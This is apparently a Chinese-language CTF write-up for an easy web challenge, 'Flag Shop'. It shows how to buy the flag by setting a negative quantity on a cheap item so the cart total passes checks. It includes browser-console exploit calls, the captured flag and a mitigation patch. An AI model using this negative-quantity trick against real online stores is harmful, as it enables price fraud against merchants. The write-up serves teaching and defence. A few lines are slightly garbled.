# Writeup: 飄揚商店 (Easy Challenge)

這是一個入門級的 Web CTF 挑戰，目標是找出隱藏在商店中的 Flag。

## 挑戰資訊
- **名稱**: 飄揚商店 (Flag Shop)
- **類型**: Web / Logic Flaw
- **難度**: Easy
- **相關漏洞**: [CWE-1284: Improper Validation of Specified Quantity in Input](https://cwe.mitre.org/data/definitions/1284.html)

---

## ⛔️ Rabbit Holes (誤導路徑)

在尋找 Flag 的過程中，你可能會被以下線索誤導：

1.  **加密演算法 (`_0x5a1b` / `_0x26db16`)**:
    *   查看 `utils/crypto.js`，你會發現一段混淆過的加密/解密函式。
    *   **誤區**: 你可能會花大量時間嘗試逆向這個演算法，以為 Flag 被加密在某個靜態檔案中，必須手動解密。
    *   **真相**: 雖然演算法是用來保護 Flag 內容的，但你不需要手動破解它。只要成功「購買」商品，系統就會自動幫你解密。

2.  **前端驗證**:
    *   嘗試在頁面上輸入負數數量，雖然前端 UI 會跳出「❌ 輸入錯誤：數量不能為小數！」或阻止你結帳。
    *   **誤區**: 以為輸入負數是被完美阻擋的，轉而去尋找 SQL Injection 或 XSS。
    *   **真相**: 這些驗證僅存在於前端 (Client-side)，可以透過攔截封包或直接呼叫 JS 函數來繞過。

---

## 🎯 解題思路 (Solution)

### 步驟 1: 分析購物車邏輯
打開瀏覽器開發者工具 (F12)，查看 `assets/js/store.js`。你會發現 `checkout()` 函式中有以下檢查：

```javascript
checkout() {
    const total = this.cartTotal;
    
    // 檢查 1: 總金額不能小於 0
    if (total < 0) { ... return { success: false }; }

    // 檢查 2: 餘額不足
    if (total > this.state.balance) { ... return { success: false }; }

    // 扣款並解密
    this.state.balance -= total;
    ...
}
```

Flag 的價格遠高於你的初始餘額 ($100)，正常購買是不可能的。

### 步驟 2: 繞過前端限制 (CWE-1284)
雖然 UI 限制了輸入框只能輸入正整數，但 `checkout` 邏輯是基於 `cartTotal` 計算的：
`cartTotal = price * qty`

如果我們能將 `qty` 設為負數，原本昂貴的商品價格乘以負數就會變成「負債」，結帳時 `total` 會是負的...等等，`checkout` 函式第一步就擋住了 `total < 0`！

**關鍵思路**:
我們需要買兩樣東西：
1.  **Flag**: 價格很高，數量設為 1。
2.  **便宜商品**: 價格低，但數量設為**極大的負數**。

這樣一來：
`Flag ($1000) * 1` + `Cheap_Item ($10) * -100` = `$1000 - $1000 = $0`

總金額為 0 (或小於餘額的正數)，既不會觸發 `total < 0` 的檢查，也不會觸發 `total > balance` 的檢查！

### 步驟 3: 執行攻擊 (Exploit)

你可以在 Console 中直接操作 `store` 物件（因為開發者為了除錯方便，將其掛載到了 `window.store`）：

1.  **將 Flag 加入購物車**:
    ```javascript
    store.addToCart(4); // 假設 Flag ID 是 4
    ```

2.  **將便宜商品 (如 ID 1) 的數量改為負數**:
    這裡我們需要「倒貼」足夠多的錢來抵銷 Flag 的價格。
    ```javascript
    // 加入一個便宜商品
    store.addToCart(1); 
    
    // 修改數量為負數 (例如 -10000 個，足以抵銷任何價格)
    // 這裡直接呼叫 updateCartItemQty 繞過 UI 的 number input 限制
    store.updateCartItemQty(1, -10000); 
    ```

3.  **結帳**:
    此時總金額會變得很小 (甚至是負的，但我們剛才分析如果總額是負的會被擋)。
    讓我們精算或是直接讓總額變成 0 或正的小數目。
    
    或者，更簡單的暴力法：
    ```javascript
    // 讓總價變成負的很誇張，系統擋住 total < 0 ? 
    // 是的， store.js 確實有 total < 0 的檢查。
    // 所以我們必須讓 (Flag * 1) + (Cheap * NegativeQuery)Result 介於 0 到 $100 之間。
    ```
    
    *修正攻擊腳本*:
    ```javascript
    // 1. 清空購物車
    store.state.cart = [];
    
    // 2. 加入 Flag (ID 4, Price $1000000)
    store.addToCart(4);
    
    // 3. 加入干擾項 (ID 1, Price $10)
    store.addToCart(1);
    
    // 4. 計算需要的負數量
    // 目標總價 = 0
    // 1000000 * 1 + 10 * x = 0  => x = -100000
    store.updateCartItemQty(1, -100000);
    
    // 5. 結帳
    store.checkout();
    ```

### 步驟 4: 取得 Flag
執行上述腳本後，系統會判定結帳成功，並解密 Flag 內容顯示給你。

![Exploit Verification](./img/flag.png)

**Flag**: `FLAG{Y0u_B0ught_Th3_Fl4g_W1th_N3gqt1v3_M0n3y}`

---

## 🛡️ 修補建議 (Mitigation)

要修補 CWE-1284 漏洞，必須在**後端**或**核心邏輯層**嚴格驗證數量：

1.  **禁止負數數量**: 在 `addToCart` 或 `updateCartItemQty` 中，嚴格檢查 `qty > 0`。
2.  **嚴格型別檢查**: Ensure quantities are verify integers (though `Number.isInteger` was used, logic logic flow allowed bypassing).
3.  **最小金額限制**: 確保單一商品小計 (Subtotal) 不能為負數。

```javascript
// store.js 修補範例
updateCartItemQty(productId, qty) {
    if (qty <= 0) {
        throw new Error("Quantity must be positive");
    }
    // ...
}
```
